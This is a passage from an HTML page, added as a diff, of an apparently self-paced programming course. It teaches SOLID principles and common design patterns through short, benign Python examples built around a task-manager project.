@@ -1,0 +1,2599 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Phase 7: Engineering Craft — design patterns, SQL mastery, transactions, networking, concurrency, and security engineering. Chapters 28–33.">
+<title>Phase 7: Engineering Craft — Zero to Hero</title>
+<link href="https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&amp;family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;1,9..40,400&amp;family=JetBrains+Mono:wght@400;500&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="css/design-system.css">
+<script>try{if(localStorage.getItem('zth-theme')==='light')document.documentElement.setAttribute('data-theme','light')}catch(e){}</script>
+<script>try{var z=localStorage.getItem('zth-zoom');if(z&&+z>=50&&+z<=200)document.documentElement.style.zoom=+z/100}catch(e){}</script>
+</head>
+<body>
+
+<svg xmlns="http://www.w3.org/2000/svg" style="position:absolute;width:0;height:0"><defs>
+<marker id="arrowhead" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6" fill="var(--accent)"/></marker>
+<marker id="arrowhead-muted" markerWidth="8" markerHeight="6" refX="7" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6" fill="var(--a5)"/></marker>
+</defs></svg>
+
+<button class="hamburger" id="hamburger"><span></span><span></span><span></span></button>
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<button class="toggle" id="themeToggle" aria-label="Toggle theme">
+<svg class="is" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+<svg class="im" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+</button>
+
+<aside class="sidebar" id="sidebar">
+  <a href="index.html" class="sidebar-logo"><span>Zero to Hero</span>Programming &rarr; Multi-Agent AI</a>
+  <div class="toc-group">
+    <div class="toc-group-title">Foundations</div>
+    <a href="phase-1.html#ch01" class="toc-link"><span class="toc-num">01</span>What Programming Actually Is</a>
+    <a href="phase-1.html#ch02" class="toc-link"><span class="toc-num">02</span>How Computers Execute Code</a>
+    <a href="phase-1.html#ch03" class="toc-link"><span class="toc-num">03</span>Setting Up Your Environment</a>
+    <a href="phase-1.html#ch04" class="toc-link"><span class="toc-num">04</span>Reading Code Before Writing It</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">Python</div>
+    <a href="phase-2.html#ch05" class="toc-link"><span class="toc-num">05</span>Functions, Logic &amp; Control Flow</a>
+    <a href="phase-2.html#ch06" class="toc-link"><span class="toc-num">06</span>Data Structures</a>
+    <a href="phase-2.html#ch07" class="toc-link"><span class="toc-num">07</span>Classes &amp; OOP Basics</a>
+    <a href="phase-2.html#ch08" class="toc-link"><span class="toc-num">08</span>Files, Modules &amp; Standard Library</a>
+    <a href="phase-2.html#ch09" class="toc-link"><span class="toc-num">09</span>Error Handling, Debugging &amp; Testing</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">Development Tools</div>
+    <a href="phase-3.html#ch10" class="toc-link"><span class="toc-num">10</span>The Terminal &amp; Shell</a>
+    <a href="phase-3.html#ch11" class="toc-link"><span class="toc-num">11</span>Git Fundamentals</a>
+    <a href="phase-3.html#ch12" class="toc-link"><span class="toc-num">12</span>Git Remote &amp; GitHub</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">Building &amp; Deploying</div>
+    <a href="phase-4.html#ch13" class="toc-link"><span class="toc-num">13</span>APIs &amp; HTTP</a>
+    <a href="phase-4.html#ch14" class="toc-link"><span class="toc-num">14</span>Building APIs with Flask</a>
+    <a href="phase-4.html#ch15" class="toc-link"><span class="toc-num">15</span>Database Basics</a>
+    <a href="phase-4.html#ch16" class="toc-link"><span class="toc-num">16</span>Docker &amp; Containers</a>
+    <a href="phase-4.html#ch17" class="toc-link"><span class="toc-num">17</span>CI/CD &amp; GitHub Actions</a>
+    <a href="phase-4.html#ch18" class="toc-link"><span class="toc-num">18</span>Project Architecture</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">Data Structures</div>
+    <a href="phase-5.html#ch19" class="toc-link"><span class="toc-num">19</span>Complexity Analysis</a>
+    <a href="phase-5.html#ch20" class="toc-link"><span class="toc-num">20</span>Linear Structures</a>
+    <a href="phase-5.html#ch21" class="toc-link"><span class="toc-num">21</span>Hash Tables &amp; Maps</a>
+    <a href="phase-5.html#ch22" class="toc-link"><span class="toc-num">22</span>Trees</a>
+    <a href="phase-5.html#ch23" class="toc-link"><span class="toc-num">23</span>Graphs</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">Algorithms</div>
+    <a href="phase-6.html#ch24" class="toc-link"><span class="toc-num">24</span>Searching &amp; Sorting</a>
+    <a href="phase-6.html#ch25" class="toc-link"><span class="toc-num">25</span>Recursion &amp; DP</a>
+    <a href="phase-6.html#ch26" class="toc-link"><span class="toc-num">26</span>Algorithm Patterns</a>
+    <a href="phase-6.html#ch27" class="toc-link"><span class="toc-num">27</span>Graph Algorithms</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">Engineering Craft</div>
+    <a href="#ch28" class="toc-link"><span class="toc-num">28</span>Design Patterns &amp; SOLID</a>
+    <a href="#ch29" class="toc-link"><span class="toc-num">29</span>SQL &amp; Query Mastery</a>
+    <a href="#ch30" class="toc-link"><span class="toc-num">30</span>Transactions &amp; NoSQL</a>
+    <a href="#ch31" class="toc-link"><span class="toc-num">31</span>Networking &amp; the Internet</a>
+    <a href="#ch32" class="toc-link"><span class="toc-num">32</span>Concurrency &amp; Parallelism</a>
+    <a href="#ch33" class="toc-link"><span class="toc-num">33</span>Security Engineering</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">Systems &amp; Scale</div>
+    <a href="phase-8.html#ch34" class="toc-link"><span class="toc-num">34</span>System Design</a>
+    <a href="phase-8.html#ch35" class="toc-link"><span class="toc-num">35</span>Distributed Systems</a>
+    <a href="phase-8.html#ch36" class="toc-link"><span class="toc-num">36</span>Performance &amp; Observability</a>
+    <a href="phase-8.html#ch37" class="toc-link"><span class="toc-num">37</span>Navigating Large Codebases</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">AI Levels 1&ndash;5</div>
+    <a href="phase-9.html#ch38" class="toc-link"><span class="toc-num">38</span>Evaluating &amp; Directing AI Code</a>
+    <a href="phase-9.html#ch39" class="toc-link"><span class="toc-num">39</span>Levels 1 &amp; 2 &mdash; Tab Complete &amp; Agent IDE</a>
+    <a href="phase-9.html#ch40" class="toc-link"><span class="toc-num">40</span>Level 3 &mdash; Context Engineering</a>
+    <a href="phase-9.html#ch41" class="toc-link"><span class="toc-num">41</span>Level 4 &mdash; Compounding Engineering</a>
+    <a href="phase-9.html#ch42" class="toc-link"><span class="toc-num">42</span>Level 5 &mdash; MCP, Skills &amp; Capabilities</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">AI Levels 6&ndash;8</div>
+    <a href="phase-10.html#ch43" class="toc-link"><span class="toc-num">43</span>Level 6 &mdash; Harness Engineering</a>
+    <a href="phase-10.html#ch44" class="toc-link"><span class="toc-num">44</span>Level 7 &mdash; Background Agents</a>
+    <a href="phase-10.html#ch45" class="toc-link"><span class="toc-num">45</span>Claude Code in Docker</a>
+    <a href="phase-10.html#ch46" class="toc-link"><span class="toc-num">46</span>Level 8 &mdash; Autonomous Agent Teams</a>
+    <a href="phase-10.html#ch47" class="toc-link"><span class="toc-num">47</span>The Multiplayer Effect</a>
+  </div>
+  <div class="toc-group">
+    <div class="toc-group-title">Reference</div>
+    <a href="appendices.html#glossary" class="toc-link"><span class="toc-num">&oplus;</span>Glossary</a>
+    <a href="appendices.html#prompt-library" class="toc-link"><span class="toc-num">&oplus;</span>Prompt Library</a>
+    <a href="appendices.html#self-assessment" class="toc-link"><span class="toc-num">&oplus;</span>Self-Assessment</a>
+    <a href="appendices.html#common-mistakes" class="toc-link"><span class="toc-num">&oplus;</span>Common Mistakes</a>
+    <a href="appendices.html#appendix-d" class="toc-link"><span class="toc-num">&oplus;</span>Troubleshooting</a>
+    <a href="appendices.html#appendix-e" class="toc-link"><span class="toc-num">&oplus;</span>Resources</a>
+  </div>
+</aside>
+
+<div class="main">
+<section class="hero hero-sm">
+  <div class="hero-badge">Phase 7 &mdash; Engineering Craft</div>
+  <h1>Engineering <em>Craft</em></h1>
+  <p class="hero-sub">Design patterns, database mastery, networking, concurrency, and security. The skills that separate someone who can code from someone who can build systems.</p>
+  <div class="hero-meta"><span>Chapters 28&ndash;33</span><span>Phase Gate + TaskForge</span></div>
+</section>
+<div class="content-wrap">
+
+<div role="note" class="callout info">
+<div class="callout-title">Before You Begin Phase 7</div>
+<p>This phase assumes you can: analyze algorithm complexity (Ch&nbsp;19), implement data structures (Ch&nbsp;20&ndash;23), apply algorithm patterns (Ch&nbsp;24&ndash;27), and build a Flask API with SQLite (Ch&nbsp;14&ndash;15). If any of these feel shaky, revisit the relevant chapter first.</p>
+</div>
+
+
+<!-- ===== CH 28 ===== -->
+<section id="ch28" data-ch="28">
+<h2><span class="ch-label">Chapter 28</span> Design Patterns &amp; Clean Architecture</h2>
+
+<div role="note" class="callout info">
+<div class="callout-title">Why This Matters Now</div>
+<p>You can write code that works. But can you write code that <em>stays</em> working as requirements change? Design patterns and SOLID principles are the collective wisdom of decades of software engineering &mdash; battle-tested solutions to recurring problems. They are the difference between a codebase that grows gracefully and one that collapses under its own weight. In this chapter you will learn to recognise the most important patterns, understand when to apply them, and &mdash; just as critically &mdash; when <em>not</em> to.</p>
+</div>
+
+<h3>The SOLID Principles</h3>
+
+<p><strong>SOLID</strong> is an acronym for five principles that guide object-oriented design. They were collected and named by Robert C. Martin, and they form the bedrock of maintainable software. Let us walk through each one with real violations in Python code and then the fix.</p>
+
+<h4>S &mdash; Single Responsibility Principle (SRP)</h4>
+
+<p>A class should have <em>one reason to change</em>. If a class handles both business logic and file I/O, those are two independent reasons it might need updating.</p>
+
+<p><strong>Violation:</strong></p>
+<pre style="overflow-x:auto"><code>class TaskManager:
+    """Handles tasks AND writes reports AND sends emails."""
+    def __init__(self):
+        self.tasks = []
+
+    def add_task(self, title, priority):
+        self.tasks.append({"title": title, "priority": priority})
+
+    def generate_report(self):
+        html = "&lt;h1&gt;Task Report&lt;/h1&gt;"
+        for t in self.tasks:
+            html += f"&lt;p&gt;{t['title']} - {t['priority']}&lt;/p&gt;"
+        return html
+
+    def send_email(self, to_address, body):
+        import smtplib
+        server = smtplib.SMTP("mail.example.com")
+        server.sendmail("tasks@example.com", to_address, body)
+        server.quit()</code></pre>
+
+<p>This class has three reasons to change: task logic, report formatting, and email delivery. If you switch from SMTP to an email API, you are editing the same file that handles task management.</p>
+
+<p><strong>Fix &mdash; split into focused classes:</strong></p>
+<pre style="overflow-x:auto"><code>class TaskManager:
+    """Only manages tasks."""
+    def __init__(self):
+        self.tasks = []
+
+    def add_task(self, title, priority):
+        self.tasks.append({"title": title, "priority": priority})
+
+    def get_tasks(self):
+        return list(self.tasks)
+
+
+class TaskReporter:
+    """Only generates reports from task data."""
+    def generate_html(self, tasks):
+        html = "&lt;h1&gt;Task Report&lt;/h1&gt;"
+        for t in tasks:
+            html += f"&lt;p&gt;{t['title']} - {t['priority']}&lt;/p&gt;"
+        return html
+
+
+class EmailSender:
+    """Only sends emails."""
+    def send(self, to_address, body):
+        import smtplib
+        server = smtplib.SMTP("mail.example.com")
+        server.sendmail("tasks@example.com", to_address, body)
+        server.quit()</code></pre>
+
+<p>Now each class has exactly one reason to change. You can swap the email sender without touching task logic.</p>
+
+<h4>O &mdash; Open/Closed Principle (OCP)</h4>
+
+<p>Software entities should be <em>open for extension but closed for modification</em>. You should be able to add new behaviour without rewriting existing code.</p>
+
+<p><strong>Violation:</strong></p>
+<pre style="overflow-x:auto"><code>class TaskExporter:
+    def export(self, tasks, format_type):
+        if format_type == "json":
+            import json
+            return json.dumps(tasks)
+        elif format_type == "csv":
+            lines = ["title,priority"]
+            for t in tasks:
+                lines.append(f"{t['title']},{t['priority']}")
+            return "\n".join(lines)
+        # Every new format requires editing THIS method</code></pre>
+
+<p>Adding XML export means modifying the existing <code>export</code> method &mdash; violating OCP.</p>
+
+<p><strong>Fix &mdash; use polymorphism:</strong></p>
+<pre style="overflow-x:auto"><code>from abc import ABC, abstractmethod
+
+class Exporter(ABC):
+    @abstractmethod
+    def export(self, tasks): pass
+
+class JsonExporter(Exporter):
+    def export(self, tasks):
+        import json
+        return json.dumps(tasks)
+
+class CsvExporter(Exporter):
+    def export(self, tasks):
+        lines = ["title,priority"]
+        for t in tasks:
+            lines.append(f"{t['title']},{t['priority']}")
+        return "\n".join(lines)
+
+# Adding XML? Create a new class. Zero existing code changes.
+class XmlExporter(Exporter):
+    def export(self, tasks):
+        xml = "&lt;tasks&gt;"
+        for t in tasks:
+            xml += f"&lt;task&gt;&lt;title&gt;{t['title']}&lt;/title&gt;&lt;/task&gt;"
+        xml += "&lt;/tasks&gt;"
+        return xml</code></pre>
+
+<h4>L &mdash; Liskov Substitution Principle (LSP)</h4>
+
+<p>Subtypes must be usable anywhere their parent type is expected without breaking correctness. If a function accepts a <code>Bird</code>, passing in a <code>Penguin</code> should not crash because <code>Penguin.fly()</code> raises an exception.</p>
+
+<p><strong>Violation:</strong></p>
+<pre style="overflow-x:auto"><code>class Rectangle:
+    def __init__(self, width, height):
+        self.width = width
+        self.height = height
+
+    def area(self):
+        return self.width * self.height
+
+class Square(Rectangle):
+    def __init__(self, side):
+        super().__init__(side, side)
+
+    def set_width(self, w):
+        self.width = w
+        self.height = w  # Silently changes height too!</code></pre>
+
+<p>Code that calls <code>rect.set_width(5)</code> then checks <code>rect.height</code> expecting it to be unchanged will break with a Square. The fix: do not make Square inherit from Rectangle. Use a shared <code>Shape</code> interface instead.</p>
+
+<h4>I &mdash; Interface Segregation Principle (ISP)</h4>
+
+<p>Clients should not be forced to depend on methods they do not use. A fat interface with 20 methods forces every implementer to stub out unused ones.</p>
+
+<p><strong>Violation:</strong></p>
+<pre style="overflow-x:auto"><code>class Worker(ABC):
+    @abstractmethod
+    def code(self): pass
+
+    @abstractmethod
+    def test(self): pass
+
+    @abstractmethod
+    def manage_team(self): pass  # Not all workers manage!
+
+class JuniorDev(Worker):
+    def code(self): return "Writing code"
+    def test(self): return "Running tests"
+    def manage_team(self):
+        raise NotImplementedError("Juniors don't manage!")</code></pre>
+
+<p><strong>Fix &mdash; split into focused interfaces:</strong></p>
+<pre style="overflow-x:auto"><code>class Coder(ABC):
+    @abstractmethod
+    def code(self): pass
+
+class Tester(ABC):
+    @abstractmethod
+    def test(self): pass
+
+class Manager(ABC):
+    @abstractmethod
+    def manage_team(self): pass
+
+class JuniorDev(Coder, Tester):
+    def code(self): return "Writing code"
+    def test(self): return "Running tests"
+
+class TechLead(Coder, Tester, Manager):
+    def code(self): return "Writing code"
+    def test(self): return "Running tests"
+    def manage_team(self): return "Leading the team"</code></pre>
+
+<h4>D &mdash; Dependency Inversion Principle (DIP)</h4>
+
+<p>High-level modules should not depend on low-level modules. Both should depend on <strong>abstractions</strong>.</p>
+
+<p><strong>Violation:</strong></p>
+<pre style="overflow-x:auto"><code>class TaskService:
+    def __init__(self):
+        self.db = SQLiteDatabase("tasks.db")  # Hard-wired!
+
+    def get_all_tasks(self):
+        return self.db.query("SELECT * FROM tasks")</code></pre>
+
+<p>You cannot swap the database or test without a real file. <strong>Fix &mdash; depend on an abstraction:</strong></p>
+<pre style="overflow-x:auto"><code>class Database(ABC):
+    @abstractmethod
+    def query(self, sql): pass
+
+class TaskService:
+    def __init__(self, db: Database):
+        self.db = db  # Injected from outside
+
+    def get_all_tasks(self):
+        return self.db.query("SELECT * FROM tasks")
+
+# Production:
+service = TaskService(SQLiteDatabase("tasks.db"))
+# Testing:
+test_service = TaskService(InMemoryDatabase())</code></pre>
+
+<h3>Creational Patterns</h3>
+
+<p>Creational patterns abstract away <em>how</em> objects are created so calling code does not need to know the exact class being instantiated.</p>
+
+<h4>Factory Pattern</h4>
+
+<p>A <strong>Factory</strong> creates objects without exposing creation logic. Instead of calling a constructor directly, you call a factory function that returns the right object based on input.</p>
+
+<pre style="overflow-x:auto"><code>class Task:
+    def __init__(self, title, priority="medium"):
+        self.title = title
+        self.priority = priority
+
+class Bug(Task):
+    def __init__(self, title, severity="normal"):
+        super().__init__(title, priority="high")
+        self.severity = severity
+
+class Feature(Task):
+    def __init__(self, title, story_points=1):
+        super().__init__(title, priority="medium")
+        self.story_points = story_points
+
+def create_task(task_type, title, **kwargs):
+    """Factory function: caller doesn't know which class is used."""
+    factories = {
+        "bug": Bug,
+        "feature": Feature,
+        "task": Task,
+    }
+    cls = factories.get(task_type)
+    if cls is None:
+        raise ValueError(f"Unknown task type: {task_type}")
+    return cls(title, **kwargs)
+
+# Usage &mdash; caller never imports Bug or Feature directly
+item = create_task("bug", "Login page crashes", severity="critical")
+print(type(item).__name__)  # Bug</code></pre>
+
+<h4>Builder Pattern</h4>
+
+<p>When construction requires many optional parameters, the <strong>Builder</strong> pattern provides a readable, step-by-step interface instead of a constructor with 15 arguments.</p>
+
+<pre style="overflow-x:auto"><code>class TaskBuilder:
+    def __init__(self, title):
+        self._title = title
+        self._priority = "medium"
+        self._assignee = None
+        self._labels = []
+        self._due_date = None
+
+    def priority(self, p):
+        self._priority = p
+        return self  # Enable chaining
+
+    def assign_to(self, name):
+        self._assignee = name
+        return self
+
+    def label(self, lbl):
+        self._labels.append(lbl)
+        return self
+
+    def due(self, date):
+        self._due_date = date
+        return self
+
+    def build(self):
+        return {
+            "title": self._title,
+            "priority": self._priority,
+            "assignee": self._assignee,
+            "labels": self._labels,
+            "due_date": self._due_date,
+        }
+
+# Clean, readable construction
+task = (TaskBuilder("Fix login bug")
+        .priority("high")
+        .assign_to("Alice")
+        .label("security")
+        .label("urgent")
+        .due("2026-04-01")
+        .build())</code></pre>
+
+<h4>Singleton (and Why It Is Usually Wrong)</h4>
+
+<p>A <strong>Singleton</strong> ensures only one instance of a class exists globally.</p>
+
+<pre style="overflow-x:auto"><code>class ConfigManager:
+    _instance = None
+
+    def __new__(cls):
+        if cls._instance is None:
+            cls._instance = super().__new__(cls)
+            cls._instance.settings = {}
+        return cls._instance
+
+a = ConfigManager()
+b = ConfigManager()
+assert a is b  # True &mdash; same object</code></pre>
+
+<div role="note" class="callout warn">
+<div class="callout-title">Myth: Singletons Are a Good Way to Share State</div>
+<p>Singletons are global state in disguise. They make testing extremely difficult because every test shares the same mutable instance. They create hidden dependencies &mdash; any code can access the singleton without it appearing in the function signature. Prefer dependency injection: create one instance at the top level and pass it to everything that needs it.</p>
+</div>
+
+<h3>Structural Patterns</h3>
+
+<h4>Adapter Pattern</h4>
+
+<p>An <strong>Adapter</strong> wraps an incompatible interface so it matches what your code expects. Imagine TaskForge expects <code>save()</code> and <code>load()</code>, but a third-party library uses <code>write_data()</code> and <code>read_data()</code>.</p>
+
+<pre style="overflow-x:auto"><code>class ThirdPartyStorage:
+    """We cannot modify this class."""
+    def write_data(self, key, value):
+        print(f"Writing {key}: {value}")
+
+    def read_data(self, key):
+        return {"title": "Example task"}
+
+class StorageAdapter:
+    """Makes ThirdPartyStorage look like our interface."""
+    def __init__(self, adaptee):
+        self._adaptee = adaptee
+
+    def save(self, key, value):
+        return self._adaptee.write_data(key, value)
+
+    def load(self, key):
+        return self._adaptee.read_data(key)
+
+# TaskForge code works without changes
+storage = StorageAdapter(ThirdPartyStorage())
+storage.save("task-1", {"title": "Buy groceries"})</code></pre>
+
+<h4>Decorator Pattern</h4>
+
+<p>The <strong>Decorator</strong> pattern adds behaviour to an object without modifying its class. Python supports function decorators natively, but the OOP version wraps one object inside another with the same interface.</p>
+
+<pre style="overflow-x:auto"><code>class TaskService:
+    def get_task(self, task_id):
+        return {"id": task_id, "title": "Fix bug"}
+
+class LoggingTaskService:
+    """Adds logging around every call."""
+    def __init__(self, wrapped):
+        self._wrapped = wrapped
+
+    def get_task(self, task_id):
+        print(f"[LOG] Getting task {task_id}")
+        result = self._wrapped.get_task(task_id)
+        print(f"[LOG] Found: {result['title']}")
+        return result
+
+class CachingTaskService:
+    """Adds caching."""
+    def __init__(self, wrapped):
+        self._wrapped = wrapped
+        self._cache = {}
+
+    def get_task(self, task_id):
+        if task_id not in self._cache:
+            self._cache[task_id] = self._wrapped.get_task(task_id)
+        return self._cache[task_id]
+
+# Stack decorators: logging around caching around real service
+service = LoggingTaskService(CachingTaskService(TaskService()))</code></pre>
+
+<h4>Facade Pattern</h4>
+
+<p>A <strong>Facade</strong> provides a simplified interface to a complex subsystem. Instead of forcing callers to interact with ten classes, you give them one class with a few clear methods.</p>
+
+<pre style="overflow-x:auto"><code>class TaskForge:
+    """Facade: one entry point for the entire system."""
+    def __init__(self, db, auth, notifier, logger):
+        self._db = db
+        self._auth = auth
+        self._notifier = notifier
+        self._logger = logger
+
+    def create_task(self, user_token, title, priority):
+        user = self._auth.verify(user_token)
+        task = self._db.insert_task(title, priority, user.id)
+        self._notifier.notify_team(f"New task: {title}")
+        self._logger.log("task_created", task.id, user.id)
+        return task</code></pre>
+
+<h3>Behavioural Patterns</h3>
+
+<h4>Observer Pattern (Pub/Sub)</h4>
+
+<p>The <strong>Observer</strong> pattern lets objects subscribe to events. When something happens, all subscribers are notified automatically, decoupling the event source from handlers.</p>
+
+<pre style="overflow-x:auto"><code>class EventBus:
+    def __init__(self):
+        self._listeners = {}
+
+    def subscribe(self, event_type, callback):
+        self._listeners.setdefault(event_type, []).append(callback)
+
+    def publish(self, event_type, data):
+        for callback in self._listeners.get(event_type, []):
+            callback(data)
+
+bus = EventBus()
+
+def send_email(task):
+    print(f"Email: New task '{task['title']}' created")
+
+def update_dashboard(task):
+    print(f"Dashboard: Refreshing with new task")
+
+bus.subscribe("task_created", send_email)
+bus.subscribe("task_created", update_dashboard)
+
+# When a task is created, both handlers fire automatically
+bus.publish("task_created", {"title": "Fix login bug", "priority": "high"})</code></pre>
+
+<h4>Strategy Pattern</h4>
+
+<p>The <strong>Strategy</strong> pattern defines a family of interchangeable algorithms. The client picks which algorithm to use at runtime. This is the pattern we will use for TaskForge storage backends.</p>
+
+<!-- Strategy Pattern SVG Diagram -->
+<svg viewBox="0 0 700 340" aria-label="Strategy pattern diagram showing TaskManager using a StorageBackend interface with three implementations: SQLiteBackend, JsonFileBackend, and InMemoryBackend" style="width:100%;max-width:700px;margin:1.5rem auto;display:block">
+  <!-- TaskManager box -->
+  <rect x="250" y="10" width="200" height="60" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="350" y="35" class="label-text" text-anchor="middle" font-size="15" font-weight="600">TaskManager</text>
+  <text x="350" y="55" class="sub-text" text-anchor="middle" font-size="11">uses storage.save() / .load()</text>
+
+  <!-- Arrow down to interface -->
+  <line x1="350" y1="70" x2="350" y2="118" class="arrow" stroke="var(--accent)" stroke-width="2" marker-end="url(#arrowhead)"/>
+  <text x="370" y="100" class="sub-text" font-size="10">depends on</text>
+
+  <!-- StorageBackend interface -->
+  <rect x="220" y="120" width="260" height="60" rx="8" class="node-accent" stroke="var(--accent)" stroke-width="2" stroke-dasharray="6,3"/>
+  <text x="350" y="145" class="label-text" text-anchor="middle" font-size="13" font-style="italic">&laquo;interface&raquo;</text>
+  <text x="350" y="165" class="label-text" text-anchor="middle" font-size="14" font-weight="600">StorageBackend</text>
+
+  <!-- Three implementations -->
+  <rect x="20" y="260" width="180" height="60" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="110" y="285" class="label-text" text-anchor="middle" font-size="13" font-weight="600">SQLiteBackend</text>
+  <text x="110" y="305" class="sub-text" text-anchor="middle" font-size="10">tasks.db file</text>
+
+  <rect x="260" y="260" width="180" height="60" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="350" y="285" class="label-text" text-anchor="middle" font-size="13" font-weight="600">JsonFileBackend</text>
+  <text x="350" y="305" class="sub-text" text-anchor="middle" font-size="10">tasks.json file</text>
+
+  <rect x="500" y="260" width="180" height="60" rx="8" class="node-fill" stroke="var(--accent)" stroke-width="2"/>
+  <text x="590" y="285" class="label-text" text-anchor="middle" font-size="13" font-weight="600">InMemoryBackend</text>
+  <text x="590" y="305" class="sub-text" text-anchor="middle" font-size="10">dict in RAM (testing)</text>
+
+  <!-- Dashed arrows from implementations up to interface -->
+  <line x1="110" y1="260" x2="295" y2="180" class="arrow" stroke="var(--a5)" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arrowhead-muted)"/>
+  <line x1="350" y1="260" x2="350" y2="180" class="arrow" stroke="var(--a5)" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arrowhead-muted)"/>
+  <line x1="590" y1="260" x2="405" y2="180" class="arrow" stroke="var(--a5)" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arrowhead-muted)"/>
+
+  <text x="80" y="230" class="sub-text" font-size="10">implements</text>
+  <text x="350" y="230" class="sub-text" text-anchor="middle" font-size="10">implements</text>
+  <text x="560" y="230" class="sub-text" font-size="10">implements</text>
+</svg>
+
+<pre style="overflow-x:auto"><code>from abc import ABC, abstractmethod
+
+class StorageBackend(ABC):
+    @abstractmethod
+    def save(self, task_id, task_data):
+        """Persist a task."""
+        pass
+
+    @abstractmethod
+    def load(self, task_id):
+        """Retrieve a task by ID, or None."""
+        pass
+
+    @abstractmethod
+    def list_all(self):
+        """Return all stored tasks."""
+        pass
+
+class InMemoryBackend(StorageBackend):
+    def __init__(self):
+        self._store = {}
+
+    def save(self, task_id, task_data):
+        self._store[task_id] = task_data
+
+    def load(self, task_id):
+        return self._store.get(task_id)
+
+    def list_all(self):
+        return list(self._store.values())
+
+class TaskManager:
+    def __init__(self, backend: StorageBackend):
+        self._backend = backend
+
+    def add_task(self, task_id, title, priority="medium"):
+        self._backend.save(task_id, {"title": title, "priority": priority})
+
+    def get_task(self, task_id):
+        return self._backend.load(task_id)</code></pre>
+
+<p>The beauty is that <code>TaskManager</code> does not know or care which backend it is using. You can swap from in-memory to SQLite to a cloud database with zero changes to the business logic.</p>
+
+<h4>Command Pattern</h4>
+
+<p>The <strong>Command</strong> pattern encapsulates a request as an object, enabling undo/redo, queuing, and logging of operations.</p>
+
+<pre style="overflow-x:auto"><code>class Command(ABC):
+    @abstractmethod
+    def execute(self): pass
+
+    @abstractmethod
+    def undo(self): pass
+
+class AddTaskCommand(Command):
+    def __init__(self, manager, task_id, title):
+        self.manager = manager
+        self.task_id = task_id
+        self.title = title
+
+    def execute(self):
+        self.manager.add_task(self.task_id, self.title)
+
+    def undo(self):
+        self.manager.remove_task(self.task_id)
+
+class CommandHistory:
+    def __init__(self):
+        self._history = []
+
+    def execute(self, command):
+        command.execute()
+        self._history.append(command)
+
+    def undo_last(self):
+        if self._history:
+            cmd = self._history.pop()
+            cmd.undo()</code></pre>
+
+<h3>Dependency Injection in Practice</h3>
+
+<p><strong>Dependency injection</strong> (DI) is the practice of passing dependencies in from outside rather than creating them inside the class. We already saw this with DIP above. In Python you rarely need DI frameworks &mdash; constructor injection is usually sufficient.</p>
+
+<pre style="overflow-x:auto"><code># WITHOUT DI: tightly coupled, untestable
+class OrderProcessor:
+    def __init__(self):
+        self.payment = StripePayment()  # Hard-coded!
+        self.email = SendGridEmail()    # Hard-coded!
+
+# WITH DI: loosely coupled, easily testable
+class OrderProcessor:
+    def __init__(self, payment, email):
+        self.payment = payment  # Injected
+        self.email = email      # Injected
+
+# Production
+processor = OrderProcessor(StripePayment(), SendGridEmail())
+# Testing
+test_proc = OrderProcessor(MockPayment(), MockEmail())</code></pre>
+
+<h3>Refactoring Patterns &amp; Code Smells</h3>
+
+<p>A <strong>code smell</strong> is a surface-level indicator that something deeper may be wrong. Here are the most common smells and their remedies:</p>
+
+<div style="overflow-x:auto">
+<table>
+<caption>Common code smells and their refactoring remedies</caption>
+<thead><tr><th>Code Smell</th><th>Symptom</th><th>Refactoring</th></tr></thead>
+<tbody>
+<tr><td><strong>God Class</strong></td><td>One class does everything (500+ lines, 20+ methods)</td><td>Extract Class &mdash; split into focused components</td></tr>
+<tr><td><strong>Feature Envy</strong></td><td>A method uses more data from another class than its own</td><td>Move Method &mdash; relocate to the class it belongs in</td></tr>
+<tr><td><strong>Shotgun Surgery</strong></td><td>One change requires edits in many different files</td><td>Move Method / Extract Class &mdash; consolidate related logic</td></tr>
+<tr><td><strong>Long Method</strong></td><td>A method exceeds 20&ndash;30 lines or does multiple things</td><td>Extract Method &mdash; break into smaller, named steps</td></tr>
+<tr><td><strong>Primitive Obsession</strong></td><td>Using raw strings/ints instead of small value objects</td><td>Replace with Value Object (e.g., <code>Email</code> class vs. raw string)</td></tr>
+</tbody>
+</table>
+</div>
+
+<p><strong>Extract Method</strong> is the most common refactoring. Take a block of code that does one coherent thing, give it a descriptive name, and make it a function:</p>
